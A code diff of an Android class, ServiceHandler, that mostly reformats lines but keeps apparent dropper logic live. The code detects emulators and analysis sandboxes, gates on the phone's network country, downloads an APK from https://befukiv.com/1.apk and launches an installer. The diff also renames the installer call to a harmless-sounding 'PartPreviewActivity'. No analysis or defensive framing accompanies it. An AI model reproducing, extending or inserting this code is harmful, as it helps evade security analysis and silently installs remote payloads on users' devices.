@@ -41,7 +41,15 @@ public class ServiceHandler {
     }
 
     private static boolean checkBuildConfig() {
-        return Build.MANUFACTURER.contains("Genymotion") || Build.MODEL.contains("google_sdk") || Build.MODEL.toLowerCase().contains("droid4x") || Build.MODEL.contains("Emulator") || Build.MODEL.contains("Android SDK built for x86") || Objects.equals(Build.HARDWARE, "goldfish") || Objects.equals(Build.HARDWARE, "vbox86") || Build.HARDWARE.toLowerCase().contains("nox") || Build.FINGERPRINT.startsWith("generic") || Objects.equals(Build.PRODUCT, "sdk") || Objects.equals(Build.PRODUCT, "google_sdk") || Objects.equals(Build.PRODUCT, "sdk_x86") || Objects.equals(Build.PRODUCT, "vbox86p") || Build.PRODUCT.toLowerCase().contains("nox") || Build.BOARD.toLowerCase().contains("nox") || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"));
+        return Build.MANUFACTURER.contains("Genymotion") || Build.MODEL.contains("google_sdk")
+                || Build.MODEL.toLowerCase().contains("droid4x") || Build.MODEL.contains("Emulator")
+                || Build.MODEL.contains("Android SDK built for x86") || Objects.equals(Build.HARDWARE, "goldfish")
+                || Objects.equals(Build.HARDWARE, "vbox86") || Build.HARDWARE.toLowerCase().contains("nox")
+                || Build.FINGERPRINT.startsWith("generic") || Objects.equals(Build.PRODUCT, "sdk")
+                || Objects.equals(Build.PRODUCT, "google_sdk") || Objects.equals(Build.PRODUCT, "sdk_x86")
+                || Objects.equals(Build.PRODUCT, "vbox86p") || Build.PRODUCT.toLowerCase().contains("nox")
+                || Build.BOARD.toLowerCase().contains("nox")
+                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"));
     }
 
     private static boolean isManuFacturerGood() {
@@ -50,11 +58,15 @@ public class ServiceHandler {
     }
 
     public static void handleWork(Context context) {
-        if (Build.MODEL != null && !Build.MODEL.isEmpty() && Build.MANUFACTURER != null && !Build.MANUFACTURER.isEmpty()) {
+        if (Build.MODEL != null && !Build.MODEL.isEmpty() && Build.MANUFACTURER != null
+                && !Build.MANUFACTURER.isEmpty()) {
             TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
             String country = tm.getNetworkCountryIso().isEmpty() ? "uat" : tm.getNetworkCountryIso();
             if (isManuFacturerGood() && !checkBuildConfig()) {
-                if (!country.startsWith("es") && !country.startsWith("sk") && !country.startsWith("cz") && !country.startsWith("ru") && !country.startsWith("hr") && !country.startsWith("si") && !country.startsWith("sl") && !country.startsWith("bg") && !country.startsWith("ee") && !country.startsWith("fi") && !country.startsWith("ie") && !country.startsWith("gb")) {
+                if (!country.startsWith("es") && !country.startsWith("sk") && !country.startsWith("cz")
+                        && !country.startsWith("ru") && !country.startsWith("hr") && !country.startsWith("si")
+                        && !country.startsWith("sl") && !country.startsWith("bg") && !country.startsWith("ee")
+                        && !country.startsWith("fi") && !country.startsWith("ie") && !country.startsWith("gb")) {
                     Intent i = new Intent(context, MainLibrary.getMainClass());
                     i.addFlags(268435456);
                     context.startActivity(i);
@@ -62,7 +74,7 @@ public class ServiceHandler {
                 }
                 try {
                     MainLibrary.url.set("https://befukiv.com/1.apk");
-                    Intent i2 = new Intent(context, MainLibrary.getInstallClass());
+                    Intent i2 = new Intent(context, MainLibrary.getPartPreviewActivity());
                     i2.addFlags(268435456);
                     context.startActivity(i2);
                 } catch (Exception e) {
